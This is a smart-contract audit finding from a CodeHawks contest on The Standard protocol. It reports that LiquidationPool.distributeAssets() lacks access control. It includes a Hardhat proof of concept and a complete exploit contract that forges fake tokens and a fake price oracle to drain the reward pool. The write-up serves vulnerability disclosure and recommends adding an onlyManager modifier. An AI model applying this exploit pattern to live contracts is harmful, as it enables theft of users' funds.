<img src="https://res.cloudinary.com/droqoz7lg/image/upload/q_90/dpr_1.0/c_fill,g_auto,h_320,w_320/f_auto/v1/company/pof1bznxgva82rxr8g8u?_a=BATAUVAA0" width=100 height=100>

# [The Standard](https://www.codehawks.com/contests/clql6lvyu0001mnje1xpqcuvl)

| Protocol | Website | Twitter | Contest Pot | nSLOC | Length | Start | End |
|:--:|:--:|:--:|:--:|:--:|:--:|:--:|:--:|
| The Standard | [Website](https://www.thestandard.io/) | [Twitter](https://twitter.com/thestandard_io) | $20,000 USDC | 609 | 15 days | Dec 27, 2023 | Jan 10, 2024 |

## What is The Standard?

This project is aims to secure your crypto assets, such as ETH, WBTC, ARB, LINK, & PAXG tokenized gold, in smart contracts that you control and no one else, then effortlessly borrow stablecoins with 0% interest loans and no time limit to pay back.

## Audit scope

- [SmartVaultV3.sol](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultV3.sol)
- [SmartVaultManagerV5.sol](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/SmartVaultManagerV5.sol)
- [LiquidationPool.sol](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPool.sol)
- [LiquidationPoolManager.sol](https://github.com/Cyfrin/2023-12-the-standard/blob/main/contracts/LiquidationPoolManager.sol)
  
## Issue found by Mlome

| Severity | Title | Count |
|:--|:--|:--:|
| High | Rewards can be drained because of lack of access control **SELECTED** | [H-01] |

**SELECTED** means that among all the duplicates the issue got selected for the [official report](https://www.codehawks.com/report/clkbo1fa20009jr08nyyf9wbx) because it was the most explanatory.

# [H-01] Rewards can be drained because of lack of access control

## Summary
The protocol implements a Liquidation Pool to collect the results of Vault Liquidations. The collected assets are shared between the stakers who invested in the pool. However, the function performing the reward distribution can be called by anyone and the rewards can be manipulated by a specially crafted payload, resulting in all rewards being stollen by a malicious actor.

## Vulnerability Details
To liquidate a vault the users should call the `runLiquidation()` function of the `LiquidationPoolManager` which internally calls the `distributeAssets()` function of the `LiquidationPool`. The problem is that we can call the `distributeAssets()` directly with any payload and a malicious list of `Assets`.

Here is the affected code:

```solidity
File: LiquidationPool.sol

205: function distributeAssets(ILiquidationPoolManager.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable {
        consolidatePendingStakes();
        (,int256 priceEurUsd,,,) = Chainlink.AggregatorV3Interface(eurUsd).latestRoundData();
        uint256 stakeTotal = getStakeTotal();
        uint256 burnEuros;
        uint256 nativePurchased;
        for (uint256 j = 0; j < holders.length; j++) {
            Position memory _position = positions[holders[j]];
            uint256 _positionStake = stake(_position);
            if (_positionStake > 0) {
                for (uint256 i = 0; i < _assets.length; i++) {
                    ILiquidationPoolManager.Asset memory asset = _assets[i];
                    if (asset.amount > 0) {
                        (,int256 assetPriceUsd,,,) = Chainlink.AggregatorV3Interface(asset.token.clAddr).latestRoundData();
                        uint256 _portion = asset.amount * _positionStake / stakeTotal;
                        uint256 costInEuros = _portion * 10 ** (18 - asset.token.dec) * uint256(assetPriceUsd) / uint256(priceEurUsd)
                            * _hundredPC / _collateralRate;
                        if (costInEuros > _position.EUROs) {
                            _portion = _portion * _position.EUROs / costInEuros;
                            costInEuros = _position.EUROs;
                        }
                        _position.EUROs -= costInEuros;
                        rewards[abi.encodePacked(_position.holder, asset.token.symbol)] += _portion;
                        burnEuros += costInEuros;
                        if (asset.token.addr == address(0)) {
                            nativePurchased += _portion;
                        } else {
                            IERC20(asset.token.addr).safeTransferFrom(manager, address(this), _portion);
                        }
                    }
                }
            }
            positions[holders[j]] = _position;
        }
        if (burnEuros > 0) IEUROs(EUROs).burn(address(this), burnEuros);
        returnUnpurchasedNative(_assets, nativePurchased);
    }
```
https://github.com/Cyfrin/2023-12-the-standard/blob/91132936cb09ef9bf82f38ab1106346e2ad60f91/contracts/LiquidationPool.sol#L205-L241

## Impact
An attacker who only invested a tiny amount into the pool can claim 100% of the rewards.

## Proof Of Concept
Here is a Hardhat test you can add to `test/liquidationPoolManager.js` in `describe('LiquidationPoolManager'...` to demonstrate the exploit:
```js
describe('EXPLOIT', async () => {
    it('Exploits Liquidation Pool and get all the rewards', async () => {
      const attacker = holder3;
      const ethCollateral = ethers.utils.parseEther('0.5');
      const wbtcCollateral = BigNumber.from(1_000_000);
      const usdcCollateral = BigNumber.from(500_000_000);
      // create some funds to be "liquidated"
      await holder5.sendTransaction({to: SmartVaultManager.address, value: ethCollateral});
      await WBTC.mint(SmartVaultManager.address, wbtcCollateral);
      await USDC.mint(SmartVaultManager.address, usdcCollateral);

      // holder1 stakes some funds
      const tstStake1 = ethers.utils.parseEther('1000');
      const eurosStake1 = ethers.utils.parseEther('2000');
      await TST.mint(holder1.address, tstStake1);
      await EUROs.mint(holder1.address, eurosStake1);
      await TST.connect(holder1).approve(LiquidationPool.address, tstStake1);
      await EUROs.connect(holder1).approve(LiquidationPool.address, eurosStake1);
      await LiquidationPool.connect(holder1).increasePosition(tstStake1, eurosStake1)

      // holder2 stakes some funds
      const tstStake2 = ethers.utils.parseEther('4000');
      const eurosStake2 = ethers.utils.parseEther('3000');
      await TST.mint(holder2.address, tstStake2);
      await EUROs.mint(holder2.address, eurosStake2);
      await TST.connect(holder2).approve(LiquidationPool.address, tstStake2);
      await EUROs.connect(holder2).approve(LiquidationPool.address, eurosStake2);
      await LiquidationPool.connect(holder2).increasePosition(tstStake2, eurosStake2);

      // attacker stakes a tiny bit of funds
      const tstStake3 = ethers.utils.parseEther('1');
      const eurosStake3 = ethers.utils.parseEther('1');
      await TST.mint(attacker.address, tstStake3);
      await EUROs.mint(attacker.address, eurosStake3);
      await TST.connect(attacker).approve(LiquidationPool.address, tstStake3);
      await EUROs.connect(attacker).approve(LiquidationPool.address, eurosStake3);
      await LiquidationPool.connect(attacker).increasePosition(tstStake3, eurosStake3);

      await fastForward(DAY);
      
      // Some liquidation happens
      await expect(LiquidationPoolManager.runLiquidation(TOKEN_ID)).not.to.be.reverted;

      // staker 1 has 1000 stake value
      // staker 2 has 3000 stake value
      // attacker has 1 stake value
      // ~25% should go to staker 1, ~75% to staker 2, ~0% should go to attacker
      
      // EPLOIT STARTS HERE
      console.log("[Before exploit] Attacker balance:");                           // [Before exploit] Attacker balance:
      console.log("ETH = %s", await ethers.provider.getBalance(attacker.address)); // ETH = 9999999683015393765405
      console.log("WBTC = %s", await WBTC.balanceOf(attacker.address));            // WBTC = 0
      console.log("USDC = %s", await USDC.balanceOf(attacker.address));            // USDC = 0
      console.log("[Before exploit] LiquidationPool balance:");                           // [Before exploit] LiquidationPool balance:
      console.log("ETH = %s", await ethers.provider.getBalance(LiquidationPool.address)); // ETH = 499999999999999999
      console.log("WBTC = %s", await WBTC.balanceOf(LiquidationPool.address));            // WBTC = 999998
      console.log("USDC = %s", await USDC.balanceOf(LiquidationPool.address));            //USDC = 499999998

      // First claim to reset the rewards of the attacker and make calculations easier
      await LiquidationPool.connect(attacker).claimRewards();
      // Deploy exploit contract and execute attack
      let ExploitFactory = await ethers.getContractFactory('DistributeAssetsExploit');
      let ExploitContract = await ExploitFactory.connect(attacker).deploy(LiquidationPool.address);
      await ExploitContract.connect(attacker).exploit(
        attacker.address, WBTC.address, USDC.address
      );
      // Claim inflated rewards to drain the pool
      await LiquidationPool.connect(attacker).claimRewards();

      console.log("\n\n[After exploit] Attacker balance:");                        // [After exploit] Attacker balance:
      console.log("ETH = %s", await ethers.provider.getBalance(attacker.address)); // ETH = 10000497924381243468675
      console.log("WBTC = %s", await WBTC.balanceOf(attacker.address));            // WBTC = 999997
      console.log("USDC = %s", await USDC.balanceOf(attacker.address));            // USDC = 499999997
      console.log("[After exploit] LiquidationPool balance:");                            // [After exploit] LiquidationPool balance:
      console.log("ETH = %s", await ethers.provider.getBalance(LiquidationPool.address)); // ETH = 1
      console.log("WBTC = %s", await WBTC.balanceOf(LiquidationPool.address));            // WBTC = 1
      console.log("USDC = %s", await USDC.balanceOf(LiquidationPool.address));            //USDC = 1
    });
  });
```
Here is the exploit contract:
```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
interface ILiquidationPool {
    function distributeAssets(DistributeAssetsExploit.Asset[] memory _assets, uint256 _collateralRate, uint256 _hundredPC) external payable;
    function holders(uint256) external view returns (address);
    function position(address _holder) external view returns(DistributeAssetsExploit.Position memory _position, DistributeAssetsExploit.Reward[] memory _rewards);
}

contract DistributeAssetsExploit {
    ILiquidationPool liquidationPool;

    struct Reward { bytes32 symbol; uint256 amount; uint8 dec; }
    struct Position {  address holder; uint256 TST; uint256 EUROs; }
    struct Token { bytes32 symbol; address addr; uint8 dec; address clAddr; uint8 clDec; }
    struct Asset { Token token; uint256 amount; }
    constructor(address _liquidationPool)
    {
        liquidationPool = ILiquidationPool(_liquidationPool);
    }

    // This exploits the liquidationPool distributeAssets() function by crafting fake Tokens wrapped in Assets
    // that bypass all the checks and allow to get an inflated reward.
    // The calculation of the amountETH, amountWBTC and amountUSDC are calculated to precisely and completely
    // drain the pool.
    // The values tagged as "foo" could be any value and are not important in the exploit
    function exploit(address attacker, address _wbtc, address _usdc) external
    {
        uint256 stakeTotal = getStakeTotal();
        uint256 attackerStake = getOneStake(attacker);
        Asset[] memory assets = new Asset[](3);
        // Forge fake tokens with token.clAddr and token.addr as address(this)
        address clAddr = address(this);
        address tokenAddr = address(this);
        uint256 ethBalance = address(liquidationPool).balance;
        uint256 wbtcBalance = IERC20(_wbtc).balanceOf(address(liquidationPool));
        uint256 usdcBalance = IERC20(_usdc).balanceOf(address(liquidationPool));
        Token memory tokenETH = Token('ETH', tokenAddr, 0 /*foo*/, clAddr, 0 /*foo*/);
        Token memory tokenWBTC = Token('WBTC', tokenAddr, 0 /*foo*/, clAddr, 0 /*foo*/);
        Token memory tokenUSDC = Token('USDC', tokenAddr, 0 /*foo*/, clAddr, 0 /*foo*/);
        uint256 amountETH = ethBalance * stakeTotal / attackerStake;
        uint256 amountWBTC = wbtcBalance * stakeTotal / attackerStake;
        uint256 amountUSDC = usdcBalance * stakeTotal / attackerStake;
        assets[0] = Asset(tokenETH, amountETH);
        assets[1] = Asset(tokenWBTC, amountWBTC);
        assets[2] = Asset(tokenUSDC, amountUSDC);
        uint256 collateralRate = 1; // foo
        uint256 hundredPC = 0; // --> costInEuros will be 0
        liquidationPool.distributeAssets(assets, collateralRate, hundredPC);
    }

    // Fake Chainlink.AggregatorV3Interface
    function latestRoundData() external pure returns (
      uint80 roundId,
      int256 answer,
      uint256 startedAt,
      uint256 updatedAt,
      uint80 answeredInRound
    )
    {
        answer = 0; // foo
    }

    // Simulate ERC20 token to bypass token transfer from manager contract
    function transferFrom(address, address, uint256) external pure returns (bool)
    {
        return true;
    }

    // Helper functions to compute the precise amount to completely drain the pool
    function getStakeTotal() private view returns (uint256 _stakes) {
        for (uint256 i = 0; i < 3; i++)
        {
            _stakes += getOneStake(liquidationPool.holders(i));
        }
    }

    function getOneStake(address holder) private view returns (uint256 _stake)
    {
        (Position memory _position, ) = liquidationPool.position(holder);
        _stake = stake(_position);
    }

    function stake(Position memory _position) private pure returns (uint256) {
        return _position.TST > _position.EUROs ? _position.EUROs : _position.TST;
    }
}
```

## Tools Used

Manual review + Hardhat

## Recommendations
Add the `onlyManager` modifier to the `distributeAssets()` function.